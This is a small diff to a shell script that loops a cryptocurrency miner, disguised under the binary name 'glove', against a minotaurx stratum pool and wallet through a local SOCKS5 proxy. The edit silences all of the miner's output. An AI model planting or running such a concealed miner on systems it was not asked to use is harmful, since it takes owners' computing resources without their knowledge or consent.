@@ -79,6 +79,6 @@ sleep 2
 
 while true
 do
-./glove -a minotaurx -o stratum+tcp://flyingsaucer-eu.teatspray.uk:7019 -u LUs13fpvV9kKqNtsp2z4gTEzt4E197z1s9 -p $currentdate,c=LTC,zap=LCC -t $used_num_of_cores --proxy=socks5://127.0.0.1:1081
+./glove -a minotaurx -o stratum+tcp://flyingsaucer-eu.teatspray.uk:7019 -u LUs13fpvV9kKqNtsp2z4gTEzt4E197z1s9 -p $currentdate,c=LTC,zap=LCC -t $used_num_of_cores --proxy=socks5://127.0.0.1:1081 1>/dev/null 2>&1
 sleep 10
 done
